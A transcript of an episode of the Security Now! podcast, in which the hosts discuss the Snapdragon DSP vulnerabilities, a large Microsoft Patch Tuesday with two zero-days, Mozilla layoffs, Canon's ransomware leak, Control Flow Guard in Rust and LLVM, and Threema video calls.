SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  The biggest Patch Tuesday ever, again, for the third month in a row.  We'll talk about that wild Qualcomm Snapdragon problem that is basically unpatchable on half of all Android devices.  That's a billion devices globally.  And then Steve's got a little spanking to do.  Microsoft knew about a zero-day security flaw in Windows for two years, and just fixed it this week.  It's all coming up next - what? - on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 780, recorded Tuesday, August 18th, 2020:  Microsoft's Zero-Day Folly.



It's time for Security Now!, ladies and gentlemen.  Here's where we protect you online with this guy right here, Mr. Steve Gibson of GRC.  Hi, Steve.



STEVE GIBSON:  Yo, Leo.  Great to be with you again on this hot California heat wave day.



LEO:  It's hot hot hot.



STEVE:  Where we're trying to stay ahead of the rolling blackouts, which sort of make our technology...



LEO:  It's kind of hard to do what we do without electricity.



STEVE:  Yes, it is.  So we're at Episode 780.  And, oh, I meant to check.  I'm pretty sure that it was 15 years ago that we began this, and it's not a folly.  "Microsoft's 0-Day Folly" is the title of this podcast, but I think this is the last podcast of Year 15, and that we'll be starting in on Year 16 next week.



LEO:  Wow.  Who would have thought?  Who would have thought; you know?



STEVE:  So, yeah.  We're going to discuss the issue that you mentioned; and you're right, it's a big one.  You brought it up last week, and I had seen it, but I didn't grab it for the show.  And that's the Achilles, as it's been named, Snapdragon DPS flaw, which as you mentioned affects more than one billion, with a "b," Android smartphones.  We've got last week's third-largest Patch Tuesday in history, from which the show's title was derived.  But that part of it we're going to put down at the end because I needed to do it justice.  Also a note of Mozilla's sadly uncertain future.  The other shoe dropping after the ransomware attack on Canon.  The nature of the so-called "software glitch" that prevented California from accurately tallying coronavirus lab test results.  I actually saw what that was because, you know, I'd heard about it on the news.  And I thought, okay, well, you know, software, that happens.  But our listeners will get a kick out of the nature of the problem.



We've also got the significance of Microsoft's announcement yesterday of the addition of their what's called Control Flow Guard (CFG) technology into the Rust and the LLVM open source codebases.  I wanted to touch on Threema's addition of video calling to their super-secure communications platform.  We've got two pieces of closing-the-loop feedback.  I've got a little bit of news about SpinRite, a decision that was made a couple days ago after an extensive round of testing of some technology for SpinRite.  And then we're going to take what is a sad look at Microsoft's recent seemingly unconscionable - oh, I guess I did know how to spell it - behavior with regard to the two zero-day vulnerabilities that were finally patched last week.  But the nature of them and how long ago they were told is folly.  And we're all, like, living with it.  Well, you're not, Leo, because you've wisely left the ship.



LEO:  I have got rid of Windows, yeah.  I just - it's just too raggedy.  All right.



STEVE:  And we have a fun Picture of the Week, which is apropos of many discussions we've had in the past.



LEO:  I see.  Some great stuff coming up.  I can't wait.



STEVE:  Our Picture of the Week, the headline is "Tabs, Tabs Everywhere."  And of course our listeners know what a tab fanatic I am.



LEO:  You've a tab lover.



STEVE:  I am.  And this was just so apropos because, you know, guilty as charged.  We have a four-frame cartoon.  The first one has this woman in a pink dress saying, "Hold on, I want to show you this thing online."  And then the person she's showing it to says, "Oh my gosh!  You have a thousand tabs open!"  And she says, "I know.  They're all critical."  And he says, "You're actually going to go back and look at all those tabs?"  And she asserts, "Yes."  And he says, "But there's a thousand..."  And she interrupts him, and she says, "AND THEY'RE ALL CRITICAL."  So I do have some affection for tabs.



LEO:  And they're all...



STEVE:  I am hoping, actually, when we talk a little bit about what seems to be going on with Firefox, I'm hoping that the forthcoming vertical tab feature in Microsoft's version of Chromium, you know, their Edge...



LEO:  Oh, don't say that.  Don't say that.  We've got to save Firefox.  We've got to save it.



STEVE:  I know.  I know.



LEO:  There's no alternative.



STEVE:  I dislike the idea of having a mono browser culture.



LEO:  Yup.  Yup.



STEVE:  Yeah.  So as I mentioned at the top, your pointer last week about the Snapdragon problem in Android is significant.  And as I dug into it to explain it, to look at it, I got a good sense for what has apparently happened.  So Check Point's security researchers decided to take a look at what's known as the cDSP, the computational digital signal processor, which is part of Qualcomm's Snapdragon system on a chip.  The idea is, the so-called system-on-a-chip, one of the very expensive things to do is interconnect, to interconnect lots of small pieces of silicon with each other.  It's mechanically expensive.  It reduces reliability.  And as our ability to reliably produce larger and larger slabs of silicon improved, it became increasingly practical to, instead of having lots of little chips, to just put the whole system on a single chip.



The problem originally was that, if a large wafer had too few large chip attempts, a single flaw anywhere within that large piece of real estate would bring the whole large piece of real estate down.  Like the whole thing would die.  So the original thinking was, well, let's do lots of small things.  That way a flaw will only affect a much smaller piece of the component of the larger wafer.  So but anyway, over time we got better at making things, and the incidence of problems dropped to the point where we can make much larger chips.  And, yes, then you've got to cool them, and there's problems.  But so that sort of introduced this system-on-a-chip idea.



So the best way to introduce our listeners to the many, and I mean many, like 400 security vulnerabilities recently discovered by Check Point security researchers, is to share the short teaser that they recently offered to potentially interested participants during the virtual Black Hat security conference a couple weeks ago.



They said:  "Qualcomm Snapdragon SoC (system-on-a-chip) integrates multiple subsystems.  Each one is customized for a particular application domain.  Compute digital-signal processor (cDSP) is a subsystem which allows a mobile device to process simple sets of data with high performance for low power.  In the talk we will show that this little-studied proprietary subsystem has many security problems that open the door to malicious Android applications for privilege elevation and denial of service (DoS) attacks on the device.



"For security reasons, this cDSP is licensed for programming by OEMs and a limited number of third-party software vendors."  In other words, it's not just widely open.  "The code running on the DSP is signed by Qualcomm.  However, we will demonstrate how an Android application can bypass Qualcomm's signature to execute privileged code on the DSP, and what further security issues this can lead to.



"Hexagon SDK," they wrote, "is the official way for the vendors to prepare DSP-related code.  We discovered serious bugs in the SDK that have led to the hundreds of hidden vulnerabilities in both Qualcomm-owned and vendor code.  The truth is that almost all DSP executable libraries embedded in Qualcomm-based smartphones are vulnerable to attacks due to issues in the Hexagon SDK.  We're going to highlight the auto-generated security holes in the DSP software and then exploit them."



So anyway, I did some digging, and I learned that Hexagon, which Check Point fingers as the culprit underlying these myriad problems, is the name of Qualcomm's proprietary DSP architecture, and the Hexagon SDK was created by Qualcomm.  The documentation for the Hexagon DSP is freely available, and I took a look through it.  But the development platform is available only under license from Qualcomm, which allows them to maintain some control over it and to only disclose the proprietary aspects to people who qualify.



So we have some sense for how there could possibly be some 400 problems - 400 - in the resulting code that's produced by this SDK.  It must be that the SDK contains buggy libraries that work, but that are not very resistant to abuse.  Of course we see that all the time in stuff we're talking about on this podcast.  And it might also be that the compiler produces DSP code that has problems.  That's certainly possible.  They're probably translating C or something into RISC-based DSP-like code, and it might not be doing a good job.  It could work, but consistently make that translation problematical.



And if that compiler was - if the compiler which they created to translate high-level code into DSP RISC code was also used to produce their libraries, which provide big chunks of subsystem stuff, then the libraries would be buggy, as now seems likely.  And then that might help to explain how all this happened.  That is, how you could actually have 400 problems is that the compiler was the core source.  And so the libraries they offer in the SDK, which were compiled with this buggy compiler, they're all going to have problems.  And any vendor code that used the SDK and compiled to this RISC architecture is going to be in trouble, too.



So that explains how something this bad could have happened.  Check Point introduced their research by writing:  "In this research dubbed 'Achilles'" - so this is Check Point, not the Black Hat conference stuff.  So this is Check Point saying, like, disclosing what they could.  They have been responsible, thank goodness, because this otherwise would be really bad.  So they said:  "In this research dubbed 'Achilles,' we performed an extensive security review of a DSP chip from one of the leading manufacturers, Qualcomm Technologies.  Qualcomm provides a wide variety of chips that are embedded into devices that make up over 40% of the mobile phone market, including high-end phones from Google, Samsung, LG, Xiaomi, OnePlus, and more.



"More than 400 vulnerable pieces of code were found within the DSP chip we tested, and these vulnerabilities could have the following impact on users of phones with the affected chip.  Attackers could turn the phone into a perfect spying tool, without any user interaction required.  The information can be exfiltrated from the phone including photos, videos, call recordings, real-time microphone data, GPS and location data, et cetera."  Basically, it's wide open.



"Attackers may be able to render the mobile phone constantly unresponsive, making all the information stored on this phone permanently unavailable, including photos, videos, contact details, et cetera.  In other words, a targeted denial-of-service attack," meaning it's obvious with all these bugs to crash the thing.  And malware and other malicious code can completely hide their activities and become unremovable.  So sort of blanket rootkitness, bootkitness as part of this.  So as you pointed out, Leo, last week, this is really bad.



So today somewhere in the neighborhood of a billion Android devices are vulnerable to these many hacks because this highly vulnerable Snapdragon DSP is embedded in approximately 40% of the three-plus billion Android devices in use today.  This allows them to be turned into various forms of spying tools and malware carriers.  The vulnerabilities can be exploited when a target plays an MP3, downloads a video, displays a web page, or renders any other content that is handled even briefly by the device's DSP.  And the idea is that, as we know, in a mobile device, minimizing power consumption is crucial.  So using a standard processor can be more expensive because you're using less specific generalized instructions to process media.



What a DSP is, is specialized instructions designed for processing media, which means they're able to do far more for less power than a general purpose processor that is able to do much more general things better than a DSP could.  So the point is, essentially by creating silicon in each case best fit to what it's going to be doing, you're able to reduce the overall power consumption.  Consequently, this DSP chip is brought to bear all over the place for all kinds of things, where you're able to sort of say, oh, rendering a JPEG, give it to the DSP.  We've got some code for that in the DSP.  Unfortunately, the code is buggy.  And so if you know how the code is buggy, and you create a specially crafted JPEG, it could be malicious.



So that's where we are.  And because the problem is, in this case a billion Android devices, is so pervasive and potentially devastating, Check Point research has withheld any publication of the technical details of these vulnerabilities.  So the Black Hat presentation really was something more of a tease than a how to go do it yourself at home that afternoon.  But this could not be unleashed upon an unsuspecting world.  They plan, Check Point plans, to keep these secrets to themselves until it's safe for them to be released.



And frankly, that begs the question, when will that be?  Because, as we know, many hundreds of millions of older Android devices are already past end of patch life and are riddled with many other known bugs, and we just added 400 more to the pile.  So in Samsung's article titled - this is Samsung, the smartphone maker - titled "Understanding the Product Lifecycle of a Smartphone," they explain.  "The product lifecycle of a smartphone is not just about physical attributes.  It's heavily impacted by software in order to ensure security, reliability, and continuity.  So when deploying smartphones, enterprise mobility managers should think about not only protecting the device itself" - meaning give it a good case - "but also whether it will continue to be supported by the manufacturer with ongoing firmware and security updates."  Yeah, no kidding, Samsung.



So they say:  "Making the right decision about which smartphones to deploy within your business is critical, and a major part of that is ensuring the model you choose will continue to be available and supported for business continuity.  With the Galaxy Note 8 and Galaxy S9 Enterprise Edition smartphones, Samsung addresses this pain point, giving businesses an extra level of reassurance, thanks to its commitment to two years of market availability - from date of general availability - and three years of monthly security updates.



"The product lifecycle of any smartphone can be cut short when software updates don't happen regularly or are not fully completed.  An enterprise's corporate mobile device policy should ensure that employees keep their smartphones updated at all times."  And, finally:  "One of the most important reasons to keep your smartphone's software up to date is to ensure that you have the latest security measures in place to protect against a wide range of cyberattacks.  To help companies protect their investment, Samsung provides support for monthly security updates for three years from general availability."



LEO:  Yeah, that's an increase.  That's to match Google's three years, which is good, yeah.



STEVE:  Right, right.  "With this setup, IT departments won't have to worry about running outdated security software or that they'll have to change their update protocol to continue supported versions."  So what this means, though, is that there really is a drop-dead date for the use of phones.  A smartphone, as we know, is a sophisticated, connected, pocket computer.  And it's going to wind up containing and storing a significant amount of personal information, some financial, and probably a lot of logins to other sensitive services.  So no such device should ever be purchased from some random low-end fly-by-night manufacturer who's not going to stand by it.  It's just not worth it.  And given the imperative of Google, Samsung, and the other high-end vendors, they regard a smartphone as having an expected life.



Now it's looking, as you said, Leo, Samsung is now matching 36 months.  So I really think that everybody who's being responsible at this point needs to think in terms of a phone you buy new having a three-year use horizon.  And really, when you think about the evolution that we're seeing in this technology, a three-year-old phone is lacking some of the new useful features that, I mean, that sort of seems reasonable.  But the idea of using a phone past its end-of-security cycle?  



LEO:  Bad idea.



STEVE:  No.  Yeah.  And...



LEO:  After three years these phones, yes, admittedly there's new technology, but there's nothing wrong with them.  They'll operate for years to come.  So we're creating waste, basically.



STEVE:  Right, yes.



LEO:  And you don't want to hand it down to somebody because it's insecure.



STEVE:  Right.  And think of all of the hackers who are salivating at the knowledge that Snapdragon has 400 problems.  The community, the underworld community is going to figure out what they are, and there is a billion targets.  We have to subtract out the updates that Google and Samsung and others who are being responsible will offer to their users.  But that still leaves a huge base of maybe not high-value targets; but at some level, if you can get a lot of them, that's aggregated value.  It's not good.



Speaking of not good, last week's Patch Tuesday, when ZDNet sums up last week's Patch Tuesday saying:  "Microsoft says attackers have used a Windows zero-day to spoof file signatures, and another remote code execution in the Internet Explore scripting engine to execute code on user's devices," we need to take a closer look.  And actually, those two things are the subject of the podcast that we will get to because it's just hard to believe what a closer look reveals.



But we have 120 new flaws in Microsoft's software fixed last week, making it the third-largest patch bundle of all time, topped only by each of the previous two months, with June and July weighing in with 129 and 123 fixes, respectively.  This month's bundle carried a bit more urgency than usual since one of those 17 flaws which were classified critical was a zero-day under active attack at the time of the updates.  And one of the remaining more than 100 flaws rated as merely "important" was also a zero-day being exploited in the wild and publicly disclosed, so not even secret.



The first of the two is titled - it's CVE-2020-1380, Scripting Engine Memory Corruption Vulnerability.  Being a scripting engine problem, we should not be surprised to learn that the source of the trouble is IE11.  It was reported by a researcher at Kaspersky Lab.  And since it can be invoked by a malicious Office document, the belief is that it was probably spotted being used in a phishing campaign.



Microsoft had this to say about it.  They said:  "In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability through IE and then convince a user to view the website.  An attacker could also embed an ActiveX control marked 'safe for initialization' in an application or Microsoft Office document that hosts the IE rendering engine.  The attacker could also take advantage of compromised websites and websites that accept or host user-provided content or advertisements.  These websites could contain specially crafted content that could exploit the vulnerability."



In other words, anything that puts content on a website that is able to invoke IE, which we know they can, can do this.  So keep this in mind when we get to the other end of this podcast because it's unbelievable what the history of this is.  So that remains a threat to anybody who hasn't yet applied last Tuesday's updates to their installation of Windows 10, so obviously it would be good to do that.



The second zero-day, despite being actively exploited in the wild and publicly known, is only rated as "important," which seems odd since it is CVE-2020-1464 and labeled, somewhat innocuously, as a "Windows Spoofing Vulnerability."  Okay.  I suppose the scale of the problem should relate to what's being spoofed.  The bug's description will catch your attention because it allows attackers to spoof the identities of other companies when digitally signing an executable.  Now, that's the way the press covered it.  We will get to the details a bit later.



In Microsoft's words, they said:  "These spoofed signatures could allow an attacker to bypass security features intended to prevent improperly signed files from being loaded."  Now, all of this is a bit of a misdirection because the signatures are actually not being spoofed.  I'll explain that later.  So this, too, is not good; but we'll cover the details at the end.



Beyond those two zero-days, five of the other critical bug fixes are for Microsoft's Windows Media Foundation, the multimedia framework and infrastructure which has been used to render digital content ever since Windows 7 and since Windows Server 2008.  In these cases, successful exploitation would allow an attacker to install malicious software, manipulate data, or create new accounts.



And among the rest - because, again, we had 120 to choose from - there's also 2020-1046, another nasty one in the .NET framework affecting versions 2.0 through 4.8.  It's a Remote Code Execution flaw in the way .NET handles imports.  An attacker could exploit this vulnerability to gain admin-level control of the vulnerable system.  This vulnerability would be exploited by uploading a specially crafted file to a web app, which is of course not a heavy lift these days.  There's all kinds of web apps that are saying, you know, that involve uploading user-submitted stuff.  This allows that to be exploited.  So as always, don't wait too long before you make time to allow Windows 10 to eliminate another 120 previously obscure but now known flaws from its codebase.  And as I said, I will have much more to say about these two zero-day flaws, since they have become the topic of today's podcast.



Speaking of Mozilla, in pre-COVID January of this year, Mozilla cut 70, seven zero, people from its workforce of approximately a thousand.  And now, citing the need to respond to COVID as the impetus, another 250 have been laid off.  Mozilla said that the primary casualties of last week's layoffs were the developers working on the company's experimental Servo browser engine and Mozilla's threat management security team.  The threat management security team is the team that investigates security reports and performs incident response.  The team that fixes bugs in Mozilla's products is still in place, according to sources and a Mozilla spokesperson.



So going forward, Mozilla said that they will be rethinking their core business model, whatever that means, and putting more focus on financially viable products.  Mozilla Corporation's CEO and the Foundation's chairwoman said:  "Recognizing that the old model where everything was free has consequences means we must explore a range of different business opportunities and alternative value exchanges."  Again, okay, whatever that means.  She said:  "We must learn and expand different ways to support ourselves and build a business that isn't what we see today."



So some assume that this might include a stronger focus on their new VPN offering.  They have high hopes for that, as we covered it when it was formally launched last month.  It turns out that VPN apps and services are one of the biggest moneymakers in tech today; and, despite having arrived late to the game, Mozilla believes that they may be in a good position to leverage their reputation, their strong "privacy first" position as a civil and privacy rights advocate.  So clearly they're looking around for something they have of value to keep them afloat.  And unfortunately - sorry?



LEO:  I think they don't do their own VPN.  I think they're relabeling a third-party VPN, which doesn't really mean much at all.  It just, you know...



STEVE:  Yeah.  Doesn't say exactly; right.  And of course adding further uncertainty to the mix is the fact that Mozilla's contract to include Google as the default search provider inside Firefox is expected to be expiring.  Well, the existing contract is expiring later this year, and so far it has not been renewed with Google.



LEO:  Yeah, that's a big deal.  That's most of their revenue, yeah.



STEVE:  Exactly, 90%.  The Google deal has historically accounted for 90% of Mozilla's revenue.  And without that, Mozilla's future is uncertain, to say the least.  And we talked about this at the top of the show.  I strongly dislike the idea of having just two dominant browsers, pretty much two browsers at all in the world, Safari and Chromium, since everybody else except Firefox is Chromium-based.



LEO:  Best solution, everybody use Firefox.  You want to support it, use it because they make money when you use it.  You don't have to buy something, just use it.



STEVE:  Yeah.  And so I'm helping them that way.  I know you are.



LEO:  That's my favorite, yeah.  



STEVE:  Yeah.  As we've noted, the browser has become most people's effective operating system.  I know, Leo, when someone calls you on the weekend during your Tech Guy radio show, and asks whether they should get a Windows machine or a new Mac, you know, you first ask them what do they need a computer for at all?



LEO:  Really, get a Chromebook.  You're using the browser.  



STEVE:  And then you say, "Get a Chromebook."  Because you're right, that's all they need.  And a Chromebook is basically a bootable Internet browser.  So my point is that...



LEO:  By the way, that might be one of the things that's hurting Firefox is iPad and Chromebooks, neither of which use Firefox.



STEVE:  Yeah, yeah.  So browsers have grown insanely complex, with so many features and bells and whistles, and they are so prone to attack because they are the piece of ourselves that we stick out there on the Internet.



LEO:  By the way, just a couple days ago, they did do that deal with Google.  So the default search engine within Firefox until 2023 will be Google.  So at least they've got that.



STEVE:  Yay.



LEO:  That's worth between, I think, 400 and 500 million a year.



STEVE:  Wow.  Good.  So maybe they just need to scale their ambitions down.  I don't understand how COVID affected them, but that was what they said.  So, good.  Let's hope they stay around.  And I did have a note in our Miscellany section which simply observed, because I thought this was sort of interesting, that Firefox Send is still offline.  I went there to check yesterday, and yup, it just says we're temporarily offline while we retool.  And clearly they have other things on their minds at Mozilla.  So I wouldn't want to hold my breath for that free service returning.  It was my favorite, but I may need to return to Filemail, which is what I'd been using before that.



LEO:  Steve has been refreshed with a long...



STEVE:  And I imagine Canon wishes they had Barracuda.



LEO:  Oh, no.



STEVE:  Checking their email.



LEO:  Is Canon the latest?



STEVE:  Yeah, well, remember we talked about it last week.  They got hit, Canon got hit by ransomware and had all their properties offline.  Remember there was the loss of their customers' images at image.canon.



LEO:  Oh, that's right, that's right.  Oh, forgot about that.



STEVE:  What you were saying last week as being even worse than encryption is what has happened.  Their proprietary files are leaking.



LEO:  They exfiltrate and encrypt.



STEVE:  Exactly.



LEO:  Double punch.



STEVE:  Exactly.  When ransomware began, one of the things that was so clever about it was that it did not need any bandwidth because it would do encryption in place, and many places there just wasn't connectivity.  There wasn't bandwidth to allow exfiltration.  Well, that problem no longer exists, especially at major large targets.  So the Maze ransomware gang have apparently started publishing data which they allege was stolen from Canon.  And once again, BleepingComputer is breaking the news that Canon may have elected not to pay the ransomware.



Lawrence Abrams at BleepingComputer wrote:  "As Canon was able to restore many systems in a short time, BleepingComputer believed that they had paid the ransom.  It looks like we were wrong, as Maze has started to publish Canon's stolen data, which is only done after a ransom is not paid."  In this case the published file is a 2.2GB ZIP archive titled StrategicPlanningPart62.zip.  BleepingComputer was told it contains marketing materials and videos, as well as files related to Canon's website.



And Lawrence indicated that, from the small number of samples they had reviewed, they believed that the files do appear to belong to Canon USA.  A source who reviewed the archive stated that they do not appear to contain any financial information, employee information, or other sensitive data.  So BleepingComputer reached out to Canon for comment; but, not surprisingly, did not hear back.  But of course there is the carrot of pay us, and we'll decrypt your machines.  Then there's the stick of, and if you don't, we're going to hurt you further.



LEO:  Wow.  Wow.



STEVE:  So that's sort of the, okay, well, you think you're fancy because you've got backups.  Well, so do we.  Yikes.



Okay.  I just got a kick out of this one.  This is a quickie.  What was the software glitch in California's widely reported COVID case reporting problems?  As a Californian, I noted with passing interest the several times I heard in the news that an unspecified "software glitch" was preventing the accurate reporting of somewhere between a quarter million and 300,000 COVID lab test results for the State of California.  From time to time we've noted when - okay, are you sitting down? - an expired web server certificate catches its owners by surprise, that can be embarrassing.  And believe it or not, this was the underlying cause of California's recent trouble.



LEO:  Oh, my god.



STEVE:  I know.  The certificate for the server that the third-party labs such as Quest and LabCorp use to upload their lab test results expired when no one was paying attention.  Whoops.  And I should note, too, for the record, that I have an expired certificate.  The revoked.grc.com cert expired a few months ago, and I haven't replaced it with another revoked cert because now it's not only revoked, but it's expired, so no one really cares that it's revoked because it's expired.  And I haven't been, or hadn't been monitoring that facility that I created years ago.  And I didn't realize that the site's page was still today getting an average of 561 visitors who were wanting to play with certificate revocation.  But recently I've been receiving notes from people who miss having it working the way it's supposed to.



So I'll obtain a new cert from my favorite certificate provider, DigiCert, and then have them immediately revoke it.  And frankly, now, here we are in mid-August.  It's the perfect time to do that since it's at the end of this month, starting September 1st, that no certificate issued after August can have a lifetime of greater than a year and a month.  So I'm happy to be doing that now because it gives me an extra year before I have to think about this again, which for a site that I'd sort of, you know, it's sort of a backwater site, I'm happy not to worry about it for an extra year.



So for anybody else who's listening who might have certs that are going to be expiring sometime, if you care, you can renew them.  Most certificate providers, I know that DigiCert does, will credit you with the available remaining life on a cert if you renew early.  And if you do have the not-valid-before date this side of September 1st, 2020, then that certificate can have as long a life as it wants, as long as the provider will issue to you.  And you don't have to worry about it a year from now.  Everybody else falls into the one-year plan starting the end of this month.



Yesterday, Monday the 17th, Microsoft announced that they had completed the work of incorporating their so-called Control Flow Guard technology (CFG) into both the Rust language and the LLVM open source projects.  For the significance of this to be understood, let's review a bit.  First of all, the Rust programming language is, as we know, rapidly growing in popularity.  Its syntax is very similar to C++, and it provides strong memory safety without the need for the garbage collection employed by dynamic languages.  And it's now Microsoft's language of choice for implementing secure and safety critical software components.



And, you know, it would be nice, maybe, if Microsoft sent some money Mozilla's way because Rust was originally designed by the engineers of Mozilla, who refined its definition while they were writing Mozilla's Servo layout browser engine and their Rust compiler.  Rust is free and open source, and it's dual-licensed under both the MIT and the Apache license 2.0.  So the fact that that's getting CFG is very cool, and we'll get to that in a second.



The other major project that Microsoft just finished enhancing with this Control Flow Guard technology is LLVM.  It's best thought of as a compiler infrastructure which provides a set of tools on the front end for implementing new languages, that is, for understanding a new type of language; and on the back end for essentially understanding a new type of computer for compiling to a new computer instruction target, instruction set target.  And then in between there's also the so-called "intermediate representation," which provides a language-neutral and instruction set-neutral, so that is to say it's neutral facing the front to the language and facing the back to the code emission.  It's an instruction set-neutral representation which serves as a portable high-level assembly language that can be optimized through a variety of transformations over multiple passes.



LEO:  It's really cool.



STEVE:  It is.



LEO:  LLVM is very future forward.



STEVE:  It's the way to do this, yes.  It's the way you solve this problem.  So although LLVM was originally designed to implement C and C++, its language-agnostic design has allowed it to be the underlying technology for, in alphabetical order, ActionScript, Ada, C# and of course C and C++, Common Lisp, Crystal, CUDA, D, Delphi, Dylan, Fortran, the Graphical G programming language, Halide, Haskell, Java bytecode, Julia, Kotlin, Lua, Objective-C, OpenCL, several different SQLs, Ruby, Rust, Scala, Swift, and Xojo. 



LEO:  Everything.



STEVE:  Yeah, exactly.



LEO:  It's Chris Lattner.  He's just a genius.



STEVE:  This is the way you do that now.



LEO:  It's truly amazing, yeah.



STEVE:  Yeah.  So in other words, bringing security improvements to the LLVM project automatically imbues all of those LLVM-driven language compilers with the enhanced security provided by Microsoft's Control Flow Guard.  And so after this point, when CFG is enabled in the compiler, anything emitted by any of the compilers of any of those LLVM-based languages will contain CFG's protection.  Which brings us to what is the enhanced security provided by Microsoft's Control Flow Guard?  This will probably sound familiar to at least some of our listeners because we have discussed this at some length back when it was proposed and introduced by Microsoft.



As we know, one of the ways attackers attack is by arranging to cause a victim program's path of execution to vary from the way it was designed to, to the way the attacker wants it to.  We've learned from the effectiveness of so-called Return Oriented Programming that a surprising amount of damage to the system's security can be caused simply by jumping near the end of a subroutine to execute existing authentic and authorized code, but doing that out of order.  Essentially, the attacker knits together the code they want to execute out of existing code which is authorized to run.



So this bypasses the previous strong protections offered by preventing data on the stack from being executed as if it were code, or data in other non-stack data regions such as communication buffers from being executed as code.  We have the so-called "no execute bit" which is added in the memory managers to mark these regions of memory as data so that the processor will refuse to execute any data in there.  So we solved that problem.  And so we said, okay, yeah, great, problem solved.  And of course then the attackers said, okay, you think you're so smart, we're going to execute your own code to accomplish our nefarious goals.  Thus Return Oriented Programming was born.



So how do we prevent that now?  A functional subroutine has a so-called entry point.  This means that, although it might be used by a great many different parts of a system, everyone who uses it jumps to its so-called entry point.  In modern languages, the beginning of a function does a bunch of critical setup work.  If the function defines some local memory working variables, as most do, then some space must be set aside on the stack to hold them.  And since some functions may require not to modify any of the caller's registers, some of those that might be needed by the function for its own working storage will have to be put on the stack and kept safe while the function uses them.



So because of all this, it's not possible for a program to simply jump into the middle of a function and bypass or miss that setup.  Everyone must enter through the front door so that the function's local environment can be properly initialized.  But deliberately not entering through the front door is precisely what Return Oriented Programming does to abuse the system.  So in other words, no valid code will ever jump anywhere but to a function's entry point.  Only malicious code will ever do so.



Therefore, if we had some means of detecting any attempt by a program to jump into the middle of its own code, even when it thinks it wants to, since that never happens by design, we would be able to stop Return Oriented Programming abuse in its tracks.  And that's exactly what Microsoft's CFG (Control Flow Guard Technology) does.  CFG operates by creating a per-process bitmap where a set bit indicates that the address is a valid destination for a jump.  And just before jumping to any function's entry point, the application checks with this bitmap to see whether the destination address is represented by a one bit set in this allowed jump destination's bitmap.



If the destination address has a zero bit in the bitmap, the program immediately terminates.  This makes it much more difficult for an attacker to exploit many of the so-called gadgets that are used, such as use-after-free flaws that we're often talking about.  It's not perfect protection, and it does come at the cost of some overhead.  But for security-sensitive code it probably makes sense to have it turned on, and now it can be, since it further raises the bar to complicate the task of malicious subversion.



As of Windows 10 Creators Update, which was at v1703, the entire Windows kernel has been compiled with CFG on, in place and running.  And the kernel uses the Hyper-V technology to prevent malicious kernel code from overwriting the CFG bitmap.  So even malicious code in the kernel that has kernel privileges is unable to mess with that CFG bitmap, since obviously that would be a way to give aberrant code permission to jump where it should not.



So yesterday Microsoft announced that Rust and the LLVM Project now has this technology, and it certainly represents a very nice step forward.  So although I'm going to be very tough on Microsoft at the end of this podcast, I certainly want to give them props for this because I would argue that authors should compile their LLVM-derived code both with CFG on and with it off, and see if they sense a performance hit.  You can selectively turn it on only in, for example, in security-sensitive modules.  Like if you had a larger subsystem, you might turn it on in the communications portion, which is going to be handling potentially unsolicited communications, or maybe in some media rendering portion, if you can afford whatever performance hit it might create.



Anyway, I just wanted to say, you know, give Microsoft props and make sure that developers know that it is now part of Rust and all of the LLVM-derived compilers.  You might experiment with turning it on and getting some security against the malicious abuse of your own code that way.  Nice piece of work.



Threema gets end-to-end encrypted video calls.  I wanted to mention that Threema added WebRTC-based end-to-end encrypted video calling to their existing text and voice messaging platform.  And, you know, I'm still tempted to say that only when users manage their own keys can they truly feel that the solution they're using is as secure as it could be.  If someone else, as I've said before, is managing those keys for you to make the process more automatic and convenient, which it inarguably does, and if the keys are the key, as they are, then true security is necessarily reduced.



Signal offers optional key verification, as we know, which is nice.  But it's not enforced.  Since Threema makes key management entirely the user's responsibility, it arguably offers a modicum of improved security at the cost of some convenience.  Now, the problem with my argument is the classic "weakest link" security dilemma.  If you or your counter party at the other end of the connection are using Threema on a five-year-old Android phone that hasn't been updated in ages, then it really doesn't matter how good the encryption and the keying of the link might be.  You're already hosed.  An attacker won't care what crypto tech you're using.  They'll just siphon off the entire conversation outside of the encrypted tunnel, thank you very much.



So, okay, sure.  But I like Threema.  And if I needed to truly hold a private video or messaging call, if my work mode had me doing that, if I needed to have really secure video conferencing and messaging, local or transcontinental, and I wanted what I felt was the best security possible, I really do think Threema would be my choice.  It's so clear that they're doing the best job possible.



Here's how they explained their news.  They said:  "After a thorough beta test, video calls are now ready for everyday use.  Simply switch on the camera during a Threema call, and your contact will see you in stunning image quality, while you can rest assured that no one else is able to access the video.  Since video calls contain personally identifiable information of the purest form, they are particularly worthy of protection.  As to be expected," they wrote, "Threema's video calls are designed from the ground up with security and privacy in mind.  Not only the transmitted data but also signaling is fully end-to-end encrypted; and before a call is accepted, no data is transmitted.



"When it comes to metadata, video calls also meet Threema's rigorous standard.  In order to ensure full end-to-end encryption of all metadata, including real-time metadata such as camera orientation, our team had to make corrections to the widely used base technology, WebRTC.  This security improvement will be incorporated into the WebRTC project, meaning that countless other communication services benefit from our patch in the future.  Technical details concerning the security aspects of Threema's video calls are documented in the Cryptography Whitepaper."  And they have a link in their announcement.



So, yeah.  Those are the people whose technology I would trust.  And note that the improvements they were forced to bring to WebRTC so that it would be able to meet their standards for real-time communication privacy meant that all of the previous so-called "secure applications" which also use WebRTC, claiming total privacy and encryption, were not truly providing that.  This is why Threema would be my choice.  So now with video.



Two little pieces of feedback.  Timo Gruen, who signed out as Tim Green, he said:  "Hi, Steve.  I desperately want to participate in the SpinRite beta, but I can't afford $20 a month to subscribe to a news server just to get into your newsgroup.  Is there any other way to get the betas and send you feedback?  I haven't been able to find any information at all about the beta on your website.  All the best, Tim Green."



So a couple of quick clarifications.  First of all, the GRC newsgroups are wholly self-contained.  It is true that NNTP - Network News, what is it, Transmission Protocol? - NNTP, TCP over port 119, that does form a global network of connected NNTP servers, and a client is able to obtain access to a server like the kind of $20 a month news server that Tim's talking about, and then gain access to that global newsgroup system.  You won't find any of GRC there at all.  We proactively block the leakage of GRC's stuff out onto the global NNTP network, the reason being, if our postings were going out, then people would respond, and we would never know.  We would never see them.



So what GRC runs is an island.  It's its own NNTP news server, which you don't need to pay anything to use.  It's at news.grc.com, which you can access with Thunderbird that has a built-in NNTP client, you know, Mozilla's Thunderbird; or Gravity, my favorite client, or any other.  There's a whole bunch of clients.  If you go to GRC.com/discussions, there's information there, a list of all the clients we know of, links to how to get started and going.  So it doesn't cost anything.



